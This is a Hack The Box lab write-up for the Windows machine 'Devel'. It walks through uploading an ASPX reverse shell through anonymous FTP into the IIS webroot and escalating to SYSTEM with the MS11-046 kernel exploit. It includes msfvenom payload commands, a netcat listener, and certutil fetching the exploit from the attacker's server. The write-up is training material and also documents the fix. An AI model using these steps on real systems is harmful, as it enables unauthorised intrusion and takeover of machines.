---
title: HTB — Devel
type: lab-writeup
platform: HTB
difficulty: foundational
os: Windows
status: Complete
date: 2026-03-28
tags:
  - foundational
  - lab
  - HTB
  - windows
  - FTP
  - IIS
  - aspx
  - webshell
  - MS11-046
  - kernel-exploit
---

# HTB — Devel

## Lab Info

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Box | Devel |
| Difficulty | Easy-Medium |
| OS | Windows 7 Enterprise (6.1 Build 7600) |
| IP | Machine IP (assigned at launch) |
| Date | 2026-03-28 |

> **Summary:** Anonymous FTP write access maps to the IIS webroot, allowing ASPX webshell upload for RCE. Privilege escalation via MS11-046 (afd.sys) kernel exploit to SYSTEM.

---

## Objectives

- [x] Recon: identify FTP anonymous access and IIS webroot mapping
- [x] Exploit: upload ASPX reverse shell via FTP, trigger via HTTP
- [x] Priv esc: MS11-046 kernel exploit to SYSTEM

---

## Enumeration

### Port Scan

```bash
nmap -sC -sV -oN nmap/devel_initial <MACHINE_IP>
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 21/tcp | ftp | Microsoft ftpd — Anonymous login allowed |
| 80/tcp | http | Microsoft IIS 7.5 |

### FTP Enumeration

```bash
ftp <MACHINE_IP>
# Login: anonymous / (blank)
dir
# aspnet_client/
# iisstart.htm
# welcome.png
```

Key observation: FTP root contains IIS default files (`iisstart.htm`, `welcome.png`). This means **FTP maps directly to the IIS webroot** (`C:\inetpub\wwwroot`). Files uploaded via FTP are served via HTTP.

### Verification

```bash
# Confirm by uploading a test file
echo "test" > test.txt
ftp <MACHINE_IP>
put test.txt
# Browse: http://<IP>/test.txt → confirms file is served
```

---

## Vulnerability Background

**Misconfiguration: Anonymous FTP Write to Webroot**

The FTP service allows anonymous login with write permissions, and the FTP root is the same directory as the IIS web server document root. This allows any unauthenticated user to upload executable web content (ASPX) and trigger it via HTTP.

| Field | Detail |
|---|---|
| Weakness | CWE-276: Incorrect Default Permissions |
| Impact | Remote code execution via webshell upload |
| CVSS | N/A (misconfiguration) |
| Fix | Disable anonymous FTP, separate FTP root from webroot, restrict write permissions |

---

## Foothold

### Generate ASPX Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f aspx -o shell.aspx
```

Or for a non-Metasploit approach:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f aspx -o shell.aspx
```

### Upload and Trigger

```bash
# Upload via FTP
ftp <MACHINE_IP>
binary
put shell.aspx
bye

# Start listener
nc -lvnp 4444    # or msfconsole handler

# Trigger shell
curl http://<MACHINE_IP>/shell.aspx
```

Shell connects as `iis apppool\web` (low-privilege service account).

---

## Privilege Escalation

### System Enumeration

```cmd
whoami
# iis apppool\web

systeminfo
# Windows 7 Enterprise 6.1 Build 7600
# No hotfixes installed
# Architecture: x86

whoami /priv
# SeImpersonatePrivilege — Enabled (but JuicyPotato unreliable on Win7 x86)
```

### Kernel Exploit Selection

```bash
# Windows 7 Build 7600, no patches, x86 → many kernel exploits available
# MS11-046 (afd.sys) is reliable for this configuration
```

### MS11-046 Exploitation

```bash
# Compile or download pre-compiled MS11-046 exploit
# Cross-compile for Windows x86:
i686-w64-mingw32-gcc ms11-046.c -o ms11-046.exe -lws2_32

# Transfer to target
# On attacker:
python3 -m http.server 8080

# On target:
certutil -urlcache -f http://<YOUR_IP>:8080/ms11-046.exe C:\Users\Public\ms11-046.exe

# Or via FTP:
ftp <ATTACKER_IP>
binary
get ms11-046.exe
```

```cmd
# Execute on target
C:\Users\Public\ms11-046.exe
whoami
# nt authority\system
```

---

## Post-Exploitation

### Flags

| Flag | Location |
|---|---|
| User | `C:\Users\babis\Desktop\user.txt` |
| Root | `C:\Users\Administrator\Desktop\root.txt` |

---

## Key Takeaways

- **Anonymous FTP + webroot mapping** is a classic misconfiguration — always test if FTP maps to the web directory
- IIS executes `.aspx` files natively — upload ASPX shells for IIS targets (not PHP)
- Windows 7 with no hotfixes is a kernel exploit playground — MS11-046 is one of the most reliable
- `msfvenom` ASPX payloads work well for IIS; for manual testing, a simple ASPX webshell works too
- Always transfer files in `binary` mode over FTP to avoid corruption

---

## Tools Used

- Nmap
- Netcat
- msfvenom (payload generation)
- FTP client

---

## References

- [Hack The Box — Devel](https://app.hackthebox.com/machines/Devel)
- [MS11-046 — Microsoft](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046)
- [IIS Security Best Practices](https://docs.microsoft.com/en-us/iis/get-started/whats-new-in-iis-7/security-in-iis)

---
*Write-up completed: 2026-03-28*

## See Also

- Penetration-Testing-Methodology
- Windows-Privilege-Escalation
- Nmap
- File-Transfer-Techniques
- Reverse-Shell-Cheatsheet
---
<- [[Labs-MOC]]